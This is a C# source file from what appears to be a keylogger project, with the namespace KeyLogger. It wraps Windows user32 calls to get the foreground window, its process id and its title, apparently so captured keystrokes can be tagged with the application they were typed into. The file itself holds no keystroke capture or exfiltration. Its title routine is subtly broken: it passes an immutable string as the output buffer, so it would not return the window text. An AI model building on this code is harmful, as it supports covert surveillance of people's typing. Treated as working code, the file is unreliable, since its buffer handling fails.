using System;
using System.Collections.Generic;
using System.Text;
using System.Runtime.InteropServices;

namespace KeyLogger
{
    class APIs
    {
        //Get pointer to active window
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetForegroundWindow();

        //Process Id
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern Int32 GetWindowThreadProcessId(IntPtr hWnd, out Int32 lpdwProccesId);

        //Get name of active program
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int GetWindowText(IntPtr hwnd, string lpString, int cch);

        //public functions


        public static IntPtr GetCurrentWindowPointer()
        {
            return GetForegroundWindow();
        }

        public static Int32 GetCurrentProcessID(IntPtr pointer)
        {
            Int32 procID;
            GetWindowThreadProcessId(pointer, out procID);
            return procID;
        }

        public static string GetCurrentAppTitle()
        {
            IntPtr pointer = GetForegroundWindow();
            if (pointer.Equals(IntPtr.Zero)) return "";
            string appTitle = new string((char)0, 100);
            int titleLength = GetWindowText(pointer, appTitle, appTitle.Length);
            if (titleLength > appTitle.Length) return "UnknownProgram";
            return appTitle.Trim().Replace("\0","");
        }
    }
}
